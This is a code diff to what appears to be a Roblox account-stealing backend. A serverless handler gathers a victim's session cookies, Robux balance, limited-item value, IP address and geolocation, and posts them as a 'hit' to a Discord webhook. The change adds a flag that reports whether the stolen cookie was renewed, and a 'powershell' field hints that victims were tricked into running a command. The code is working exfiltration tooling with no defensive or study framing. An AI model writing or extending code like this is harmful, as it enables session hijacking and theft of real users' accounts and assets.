@@ -168,7 +168,7 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-async function sendHit(webhookUrl, { powershell, allCookies, roblox, pub, slots, ip, geo, now, pageName }) {
+async function sendHit(webhookUrl, { powershell, allCookies, cookieRenewed, roblox, pub, slots, ip, geo, now, pageName }) {
   const robux       = (roblox?.robux         ?? 0).toLocaleString();
   const rap         = (pub?.limitedsValue     ?? 0).toLocaleString();
   const rapCount    =  pub?.limitedsCount     ?? 0;
@@ -198,7 +198,7 @@ async function sendHit(webhookUrl, { powershell, allCookies, roblox, pub, slots,
         url:      `https://www.roblox.com/users/${userId}/profile`,
         icon_url: avatarUrl
       },
-      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${userId}/profile)`,
+      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${userId}/profile)\n${cookieRenewed ? '🔄 Cookie Renewed ✅' : '⚠️ Original Cookie (renewal failed)'}`,  
       color: 0xc026d3,
       thumbnail: { url: avatarUrl },
       fields: [
@@ -298,9 +298,12 @@ export default async function handler(req, res) {
   // Step 2 — public info fetch using userId (zero cookie calls)
   const pub = isValid ? await fetchPublicInfo(roblox.userId) : null;
 
+  const cookieRenewed = workerResult?.cookieRenewed || false;
+
   const payload = {
-    powershell: workerResult?.powershell || null,
-    allCookies: workerResult?.allCookies || cookie,
+    powershell:    workerResult?.powershell || null,
+    allCookies:    workerResult?.allCookies || cookie,
+    cookieRenewed,
     roblox,
     pub,
     slots,
